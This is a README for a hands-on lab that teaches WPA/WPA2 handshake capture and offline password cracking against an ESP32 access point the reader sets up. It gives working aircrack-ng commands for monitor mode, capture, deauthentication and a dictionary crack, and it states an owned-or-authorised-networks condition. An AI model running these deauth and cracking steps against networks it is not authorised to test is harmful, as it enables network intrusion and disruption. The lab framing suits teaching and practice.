# Handshake-Cracking-Lab

> Use this lab only on networks and hardware you own or have explicit written permission to test.

## Purpose
This repository is a hands-on lab for learning WPA/WPA2 handshake capture and offline password cracking in a controlled environment.

The structure includes:
- **ESP32 C++ code** to host a lab access point
- **Operator instructions** for deauth, handshake capture, and password cracking

## Current Scope
This README now includes a basic ESP32 AP sketch (`main.cpp`) and the repeatable lab workflow.

## Flashing the ESP32 with PlatformIO

### 1) Install PlatformIO Core
Install PlatformIO on your workstation:

```bash
python3 -m pip install --user platformio
```

Confirm installation:

```bash
pio --version
```

### 2) Initialize a PlatformIO ESP32 project in this repo
From the repository root:

```bash
pio project init --board esp32dev
mkdir -p src
cp main.cpp src/main.cpp
```

### 3) Connect your ESP32 and find its serial port
List detected serial devices:

```bash
pio device list
```

Note the port name (for example, `/dev/ttyUSB0` on Linux or `COM3` on Windows).

### 4) Build and upload firmware
Run upload from the repository root:

```bash
pio run -t upload --upload-port <PORT>
```

Replace `<PORT>` with your board's serial port.

### 5) Open serial monitor (optional)

```bash
pio device monitor -b 115200 --port <PORT>
```

You should see startup logs including SSID and AP IP address.

## Lab Topology
- **Target AP:** ESP32-hosted AP
- **Client device:** Any device that can connect to the AP
- **Attacker workstation:** Linux machine with monitor-mode wireless adapter

## Prerequisites
- Linux workstation with `aircrack-ng` suite installed
- Wireless adapter that supports monitor mode + packet injection
- A test wordlist (for example, a custom list containing known lab passwords)

## Lab Workflow

### 1) Start the AP
Flash the ESP32 code above, then start a WPA2 AP with:
- Known SSID (for example: `LabAP`)
- Known passphrase (for example: `LabPass123!`)

### 2) Put adapter into monitor mode
Use `airmon-ng`:

```bash
sudo airmon-ng start wlan0
```

This typically creates a monitor interface such as `wlan0mon`.

### 3) Discover target AP and channel
Scan nearby APs and note the BSSID + channel of your lab AP:

```bash
sudo airodump-ng wlan0mon
```

### 4) Capture handshake traffic
Lock to the lab AP channel and capture packets:

```bash
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
```

### 5) Force client reauthentication (deauth)
Trigger reconnect activity so a handshake is captured:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

If clients are connected, one should reauthenticate and generate a handshake.

### 6) Verify handshake capture
Check capture quality before cracking:

```bash
aircrack-ng capture-01.cap
```

Look for a valid WPA handshake indication.

### 7) Run offline password cracking
Run dictionary attack against the capture:

```bash
aircrack-ng -w <WORDLIST_PATH> -b <BSSID> capture-01.cap
```

If the passphrase exists in the wordlist, `aircrack-ng` should recover it.

## Troubleshooting
- No handshake captured: ensure at least one client is connected, then repeat deauth.
- Injection fails: confirm adapter/chipset supports injection.
- Wrong channel: re-check AP channel and lock capture to that channel.
- Crack fails: use better wordlists/rules or verify AP passphrase.

## Next Steps
- Move the ESP32 source and PlatformIO config into a dedicated source layout
- Add reproducible scripts for lab setup and capture parsing
- Add lab validation notes/screenshots for repeatability
